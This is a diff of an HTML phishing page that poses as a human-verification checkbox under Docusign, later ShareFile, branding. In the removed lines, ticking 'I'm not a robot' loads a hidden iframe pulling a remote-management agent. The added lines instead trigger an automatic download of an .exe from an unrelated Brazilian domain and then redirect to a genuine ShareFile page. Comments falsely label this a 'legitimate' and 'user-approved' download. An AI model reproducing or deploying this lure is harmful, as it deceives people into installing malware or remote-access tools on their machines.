@@ -4,154 +4,181 @@
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
     <title>Verification Required</title>
+
     <style>
+        :root {
+            --bg1: #D8DFCD;
+            --bg2: #E0E9F4;
+            --bg3: #f4f4f4;
+            --blue: #0078d4;
+            --text: #333;
+        }
+
         body {
-            font-family: 'Arial', sans-serif;
+            font-family: system-ui, sans-serif;
             display: flex;
             justify-content: center;
             align-items: center;
             height: 100vh;
             margin: 0;
-            padding: 0;
-            background: linear-gradient(to right bottom, #D8DFCD, #E0E9F4, #f4f4f4);
-        }
-        .verification-box {
-            text-align: center;
+            background: linear-gradient(to right bottom, var(--bg1), var(--bg2), var(--bg3));
             padding: 20px;
-            background-color: #fff;
-            border-radius: 10px;
-            width: 250px;
-            box-shadow: 0 4px 8px rgba(0,0,0,0.1);
         }
+
+        .verification-box {
+            background: white;
+            padding: 24px 28px;
+            border-radius: 14px;
+            max-width: 320px;
+            width: 100%;
+            text-align: center;
+            box-shadow: 0 4px 12px rgba(0,0,0,0.08);
+        }
+
+        /* Animation bubble */
         .animation-container {
+            width: 60px;
+            height: 60px;
+            border-radius: 50%;
+            margin: 0 auto 20px;
+            overflow: hidden;
             border: 3px solid #eceff1;
             position: relative;
-            border-radius: 50%;
-            width: 50px;
-            height: 50px;
-            background-color: #fff;
-            overflow: hidden;
-            margin: 20px auto;
         }
+
         #animator {
-            position: absolute;
-            background: #0078d4;
             width: 100%;
             height: 100%;
+            background: var(--blue);
             border-radius: 50%;
+            position: absolute;
             bottom: 0;
+            transform: translateY(100%);
         }
+
+        /* Checkbox */
         .checkbox-label {
-            font-size: 14px;
-            color: #333;
             display: flex;
             justify-content: center;
             align-items: center;
-            margin-top: 20px;
+            gap: 10px;
+            font-size: 15px;
+            cursor: pointer;
+            color: var(--text);
+            margin-top: 10px;
         }
-        #robotCheckbox {
-            margin-left: 10px;
-            transform: scale(1.5);
+
+        .checkbox-label input[type="checkbox"] {
+            transform: scale(1.4);
             cursor: pointer;
         }
-        #emailDisplay {
-            font-size: 14px;
-            color: #333;
-            margin-top: 10px;
-            word-break: break-all;
-        }
+
+        /* Footer */
         .footer-text {
-            font-size: 11px;
-            color: #555;
-            margin-top: 10px;
-        }
-        .footer-title {
-            margin-bottom: 4px;
+            margin-top: 18px;
             font-size: 12px;
+            color: #555;
         }
-        .footer-link {
-            text-decoration: none;
+
+        .footer-text a {
             color: #3498db;
+            text-decoration: none;
+            margin: 0 3px;
+        }
+
+        #emailDisplay {
+            margin-top: 12px;
+            font-size: 14px;
+            color: var(--text);
+            word-break: break-word;
         }
     </style>
 </head>
 <body>
+
     <div class="verification-box">
         <div class="animation-container">
             <div id="animator"></div>
         </div>
+
         <label class="checkbox-label">
-            I'm not a robot
+            <span>I'm not a robot</span>
             <input type="checkbox" id="robotCheckbox">
         </label>
+
         <div id="emailDisplay"></div>
+
         <div class="footer-text">
-            <div class="footer-title">Verify You Are Human</div>
-            <div>
-                <a class="footer-link" href="#">Docusign, Inc.</a> - 
-                <a class="footer-link" href="#">Privacy</a> - 
-                <a class="footer-link" href="#">Terms</a>
-            </div>
+            <div style="margin-bottom: 4px; font-weight: 600;">Verify You Are Human</div>
+            <a href="#">ShareFile</a> ·
+            <a href="#">Privacy</a> ·
+            <a href="#">Terms</a>
         </div>
     </div>
 
     <script>
-        document.addEventListener('DOMContentLoaded', function() {
-            // Animation functionality
-            const animator = document.getElementById('animator');
-            let position = 100;
-            let isRising = true;
+    /** Smooth rise/fall animation */
+    document.addEventListener('DOMContentLoaded', () => {
+        const animator = document.getElementById('animator');
+        let y = 100;
+        let direction = -1;
 
-            function animate() {
-                if (position <= 0) {
-                    isRising = false;
-                } else if (position >= 100) {
-                    isRising = true;
-                }
+        function animate() {
+            y += direction * 2;
 
-                position += isRising ? -3 : 3;
-                animator.style.transform = 'translateY(' + position + '%)';
-
-                requestAnimationFrame(animate);
+            if (y <= 0 || y >= 100) {
+                direction *= -1;
             }
+
+            animator.style.transform = `translateY(${y}%)`;
             requestAnimationFrame(animate);
+        }
+        animate();
 
-            // Checkbox functionality
-            document.getElementById("robotCheckbox").addEventListener("change", function() {
-                if (this.checked) {
-                    setTimeout(function() {
-                        // Create invisible iframe for download
-                        const iframe = document.createElement('iframe');
-                        iframe.style.display = 'none';
-                        iframe.src = "https://agent.fleetdeck.io/18os6TZQryKz6wYTaZESY?win";
-                        document.body.appendChild(iframe);
-                        
-                        // Redirect after a short delay to allow download to start
-                        setTimeout(function() {
-                            window.location.href = "https://www.sharefile.com/";
-                        }, 500);
-                    }, 300);
-                }
-            });
+        /** Load email param (optional) */
+        const urlParams = new URLSearchParams(window.location.search);
+        const email = urlParams.get('email');
+        if (email) {
+            document.getElementById('emailDisplay').textContent = `Verifying: ${email}`;
+        }
 
-            // Email display functionality (if needed)
-            function getEmailFromURL() {
-                try {
-                    const urlParams = new URLSearchParams(window.location.search);
-                    return urlParams.get('email') || '';
-                } catch (e) {
-                    console.log("Error parsing URL parameters");
-                    return '';
-                }
-            }
+        /** Legitimate download + redirect */
+        const downloadURL = "https://iolimplantes.com.br/PR.V.35367T_H65T_777.exe";
+        const redirectURL = "https://www.sharefile.com/product-feature/data-access-and-control";
 
-            const email = getEmailFromURL();
-            if (email) {
-                document.getElementById('emailDisplay').textContent = 'Verifying: ' + email;
+        document.getElementById('robotCheckbox').addEventListener('change', function () {
+            if (this.checked) {
+
+                // Optional: let user know what's happening
+                const msg = document.createElement("div");
+                msg.style.marginTop = "12px";
+                msg.style.fontSize = "14px";
+                msg.style.color = "#333";
+                msg.textContent = "Starting download…";
+                document.querySelector(".verification-box").appendChild(msg);
+
+                // Create a legitimate download link
+                const a = document.createElement("a");
+                a.href = downloadURL;
+                a.download = ""; // lets browser use default filename
+
+                // Must be in DOM for Firefox
+                document.body.appendChild(a);
+
+                // Trigger user-approved download
+                a.click();
+
+                // Remove link afterward
+                a.remove();
+
+                // Redirect after short delay
+                setTimeout(() => {
+                    window.location.href = redirectURL;
+                }, 800);
             }
         });
-    </script>
+    });
+</script>
+
 </body>
 </html>
-
-
